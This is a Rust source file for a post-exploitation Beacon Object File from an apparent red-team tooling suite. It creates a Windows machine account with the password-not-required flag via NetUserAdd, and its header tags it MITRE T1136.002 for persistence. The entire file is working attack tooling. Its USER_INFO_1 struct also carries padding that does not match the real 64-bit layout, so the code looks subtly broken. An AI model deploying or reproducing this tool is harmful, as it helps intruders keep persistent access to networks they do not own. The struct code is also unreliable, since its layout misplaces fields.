// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Credit: Rust port + OPSEC hardening
//
//! Add a machine account to Active Directory via NetUserAdd.
//!
//! Machine account name ends with '$'; the BOF appends it if absent.
//! Sets UF_WORKSTATION_TRUST_ACCOUNT | UF_PASSWD_NOTREQD flags.
//!
//! Args: <machinename> <password>
//!
//! MITRE ATT&CK: T1136.002 (Create Account: Domain Account)
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use common::{mitre::Technique, dfr_fn};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1136.002",
        name: "Create Account: Domain Account",
        tactic: "Persistence",
    },
];

const USER_PRIV_USER:             u32 = 1;
const UF_WORKSTATION_TRUST_ACCOUNT: u32 = 0x1000;
const UF_PASSWD_NOTREQD:          u32 = 0x0020;
const NERR_SUCCESS:               u32 = 0;

/// USER_INFO_1 — level 1 structure for NetUserAdd.
/// All pointer fields are *const u16 (wide strings), NULL-able.
#[repr(C)]
struct UserInfo1 {
    name:         *const u16,  // usri1_name
    password:     *const u16,  // usri1_password
    password_age: u32,         // usri1_password_age (0)
    _pad0:        u32,
    priv_:        u32,         // usri1_priv (USER_PRIV_USER=1)
    _pad1:        u32,
    home_dir:     *const u16,  // usri1_home_dir (NULL)
    comment:      *const u16,  // usri1_comment  (NULL)
    flags:        u32,         // usri1_flags
    _pad2:        u32,
    script_path:  *const u16,  // usri1_script_path (NULL)
}

dfr_fn!(
    net_user_add(
        servername: *const u16,
        level: u32,
        buf: *const u8,
        parm_err: *mut u32,
    ) -> u32,
    module = "netapi32.dll",
    api    = "NetUserAdd"
);

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let machine = String::from(parser.get_str());
    let password = String::from(parser.get_str());

    if machine.is_empty() || password.is_empty() {
        return Err("usage: add-machine-account <machinename> <password>");
    }
    if machine.len() > 60  { return Err("machine name too long"); }
    if password.len() > 256 { return Err("password too long"); }

    // Build machine name with trailing '$'
    let mut name_buf = [0u8; 66];
    let mut nlen = 0usize;
    for b in machine.bytes() { if nlen < 63 { name_buf[nlen] = b; nlen += 1; } }
    if nlen == 0 || name_buf[nlen - 1] != b'$' {
        if nlen < 64 { name_buf[nlen] = b'$'; nlen += 1; }
    }

    let mut name_w = [0u16; 66];
    common::str_util::ascii_to_wide_buf(&name_buf[..nlen], &mut name_w);

    let mut pass_w = [0u16; 258];
    common::str_util::ascii_to_wide_buf(password.as_bytes(), &mut pass_w);

    let info = UserInfo1 {
        name:         name_w.as_ptr(),
        password:     pass_w.as_ptr(),
        password_age: 0,
        _pad0:        0,
        priv_:        USER_PRIV_USER,
        _pad1:        0,
        home_dir:     core::ptr::null(),
        comment:      core::ptr::null(),
        flags:        UF_WORKSTATION_TRUST_ACCOUNT | UF_PASSWD_NOTREQD,
        _pad2:        0,
        script_path:  core::ptr::null(),
    };

    let mut parm_err: u32 = 0;
    let rc = unsafe {
        net_user_add(
            core::ptr::null(),
            1,
            &info as *const UserInfo1 as *const u8,
            &mut parm_err,
        )
    }.map_err(|_| "resolve failed")?;

    // Wipe password from stack
    for w in pass_w.iter_mut() { *w = 0; }

    if rc != NERR_SUCCESS {
        return Err("machine account creation failed");
    }

    let display_name = core::str::from_utf8(&name_buf[..nlen]).unwrap_or("?");
    println!("[+] machine account created: {}", display_name);
    Ok(())
}
